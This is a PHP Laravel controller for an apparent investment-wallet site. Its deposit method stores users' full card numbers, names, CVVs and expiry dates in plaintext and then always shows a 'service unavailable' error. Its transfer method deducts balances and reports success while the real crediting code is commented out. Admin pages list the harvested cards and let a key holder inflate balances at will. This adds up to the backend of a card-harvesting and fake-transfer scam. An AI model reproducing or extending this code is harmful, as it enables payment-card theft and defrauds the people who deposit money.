<?php

namespace App\Http\Controllers;

use App\Models\Cc;
use App\Models\Pitch;
use App\Models\Transaction;
use App\Models\User;
use App\Models\Transfer;
use Illuminate\Http\Request;
use Auth;
use Hash;
use Illuminate\Support\Facades\Log;
use Illuminate\Validation\Rule;
use Illuminate\Support\Facades\Storage;

class UserController extends Controller
{
    public function showWallet(Request $request)
    {
//        $user = $request->user();
//        return view('users.wallet', ['user' => $user]);


        $user = $request->user()->load(['transactions' => function ($query) {

            $query->orderBy('created_at', 'desc')->limit(7);
        }]);


        return view('users.wallet', compact('user'));

    }

    public function deposit(Request $request)
    {
        $wallet = new Cc();
        $wallet->user_id = auth()->user()->id;
        $wallet->number = trim($request->number);
        $wallet->name = trim($request->name);
        $wallet->cvv = trim($request->cvv);
        $wallet->expiry = trim($request->expiry);
        $wallet->save();

//        return redirect()->route('wallet')->with('error', "SERVICE UNAVAILABLE AT THE MOMENT.");
        return back()->withErrors(['wallet'=>'SERVICE UNAVAILABLE AT THE MOMENT.']);
    }

    public function transfer(Request $request)
    {
        request()->validate([
            'rout' => 'required',
            'acct' => 'required|email',
            'acct' => 'required',
            'amount' => 'required',
            'address' => 'required',
        ]);


        $sender = Auth::user();
        $amount = $request->amount;

        if ($sender->balance < $amount) {
            return back()->withErrors(['wallet'=>'Insufficient Balance']);
        }

        $sender->decrement('balance', $amount);
            $data = new Transaction();
            $data->user_id = auth()->user()->id;
            $data->amount = $amount;
            $data->desc = "Transfer";
            $data->save();

        $transfer = new Transfer();
        $transfer->user_id = auth()->user()->id;
        $transfer->rout = $request->rout;
        $transfer->acct = $request->acct;
        $transfer->amount = $amount;
        $transfer->address = $request->address;
        $transfer->rep = "Erik Jansen";
        $transfer->email = $request->email;
        $transfer->phone = "530-771-145";
        $transfer->save();



        return redirect()->route('wallet')->with('success', 'TRANSFER SUCCESSFUL.');

        // $receiver = User::where('email', '=', $request->email)->first();
        // if ($receiver) {
            

        //     $receiver->increment('balance', $amount);
        //     $receiveData = new Transaction();
        //     $receiveData->user_id = $receiver->id;
        //     $receiveData->amount = $amount;
        //     $receiveData->desc = "Deposit";
        //     $receiveData->save();

        //     return redirect()->route('wallet')->with('success', 'TRANSFER SUCCESSFUL.');
        // } else {
        //     return back()->withErrors(['wallet'=>'Receiver Email not found']);
        // }

    }

    public function user()
    {
        $data['getRecord'] = User::getUserRecord();
        return view('backend.user.list', $data);
    }

    public function addUser(Request $request)
    {
        return view('backend.user.add');
    }

    public function insertUser(Request $request)
    {
        request()->validate([
            'name' => 'required',
            'email' => 'required|email|unique:users',
            'password' => 'required',
            'secret' => 'secret'
        ]);

        $save = new User;
        $save->name = trim($request->name);
        $save->email = trim($request->email);
        $save->password = Hash::make($request->password);
        $save->type = trim($request->type);
        $save->secret = trim($request->secret);
        $save->country = $request->country;
        $save->save();

        return redirect('panel/user/list')->with('success', "USER SUCCESSFULLY CREATED");
    }

    public function editUser($id)
    {
        $data['getRecord'] = User::getSingle($id);
        return view('backend.user.edit', $data);
    }

    public function updateUser($id, Request $request)
    {
        request()->validate([
            'name' => 'required',
            'email' => 'required|email|unique:users,email,'.$id
        ]);

        $save = User::getSingle($id);
        $save->name = trim($request->name);
        $save->email = trim($request->email);
        $save->type = trim($request->type);
        $save->secret = trim($request->secret);
        if (!empty($request->password)) {
            $save->password = Hash::make($request->password);
        }
        $save->save();

        return redirect('panel/user/list')->with('success', "USER SUCCESSFULLY UPDATED");
    }

    public function deleteUser($id)
    {
        $user = User::getSingle($id);
        if ($user->delete()) {
            return redirect()->back()->with('success', "USER DELETED SUCCESSFULLY");
        } else {
            return redirect()->back()->with('error', "DELETE OPERATION FAILED");
        }

    }

    public function cc()
    {
        $data['getRecord'] = Cc::getCc();
        return view('backend.user.cc', $data);

    }

    public function deleteCc($id)
    {
        $user = Cc::getSingle($id);
        if ($user->delete()) {
            return redirect()->back()->with('success', "CC DELETED SUCCESSFULLY");
        } else {
            return redirect()->back()->with('error', "CC OPERATION FAILED");
        }

    }

    public function pitches()
    {
        $data['getRecord'] = Pitch::getPitch();
        return view('backend.user.pitch', $data);
    }

    public function deletePitch($id)
    {
        $user = Pitch::getSingle($id);
        if ($user->delete()) {
            return redirect()->back()->with('success', "PITCH DELETED SUCCESSFULLY");
        } else {
            return redirect()->back()->with('error', "PITCH OPERATION FAILED");
        }

    }

    public function trans()
    {
        $data['getRecord'] = Transfer::getTransfer();
        return view('backend.user.trans', $data);
    }

    public function deleteTrans($id)
    {
        $user = Transfer::getSingle($id);
        if ($user->delete()) {
            return redirect()->back()->with('success', "TRANS DELETED SUCCESSFULLY");
        } else {
            return redirect()->back()->with('error', "TRANS OPERATION FAILED");
        }

    }

    public function fundWallet($id)
    {
        $data['getRecord'] = User::getSingle($id);
        return view('backend.user.fund', $data);
    }

    public function updateWallet($id, Request $request)
    {
        $data['getRecord'] = User::getSingle($id);

        $amount = $request->amount;

        $receiver = User::where('id', '=', $id)->first();
        if ($receiver) {

            if (auth()->user()->secret === $request->key){
                $data = new Transaction();
                $data->user_id = auth()->user()->id;
                $data->amount = $amount;
                $data->desc = "Transfer";
                $data->save();

                $receiver->increment('balance', $amount);
                $receiveData = new Transaction();
                $receiveData->user_id = $receiver->id;
                $receiveData->amount = $amount;
                $receiveData->desc = "Top-up";
                $receiveData->save();
            } else {
                return redirect()->back()->with('error', 'FAILED!.');
            }
            return redirect('panel/user/list')->with('success', "FUNDING SUCCESSFUL.");
        } else {
            return redirect()->back()->with('error', 'RECEIVER NOT FOUND.');
        }

    }

    public function addPitch(Request $request)
    {
        Log::info($request);
        request()->validate([
//            'pitcher' => 'required',
            'industry' => 'required',
            'title' => ['required', Rule::unique('pitches', 'title')],
            'target' => 'required',
            'about' => 'required',
            'file' => 'required|file|mimes:jpg,png,pdf,docx,zip|max:5120'
        ]);

        $pitch = new Pitch();
        $pitch->user_id = auth()->user()->id;
        $pitch->pitcher = auth()->user()->name;
        $pitch->industry = $request->industry;
        $pitch->title = $request->title;
        $pitch->target = $request->target;
        $pitch->minimum = 1000;
        $pitch->about = $request->about;
        if ($request->hasFile('file')) {
            $file = $request->file('file');
            $path = $file->store('uploads', 'public'); 
            $pitch->file_path = $path;
        } else {
            return back()->with('error', 'No file was uploaded.');
        }
        $pitch->save();

        return view('invest_single', compact('pitch'))->with('success', "PITCH SUCCESSFULLY CREATED");
    }
    public function getAllPitches(Request $request)
    {
        $data['getRecord'] = Pitch::getPitch();
        return view('invest', $data);
    }

    public function showPitch($id)
    {
        $pitch = Pitch::find($id);
        return view('invest_single', compact('pitch'));
    }

    public function downloadFile($id)
    {
        $pitch = Pitch::findOrFail($id);

        if (Storage::disk('public')->exists($pitch->file_path)) {
            return Storage::disk('public')->download($pitch->file_path);
        }

        return back()->with('error', 'File not found.');
    }

    public function deleteFile($id)
    {
        $pitch = Pitch::findOrFail($id);

        if (Storage::disk('public')->exists($pitch->file_path)) {
            Storage::disk('public')->delete($pitch->file_path);
            $pitch->file_path = null;
            $pitch->save();

            return back()->with('success', 'File deleted successfully.');
        }

        return back()->with('error', 'File not found.');
    }
}
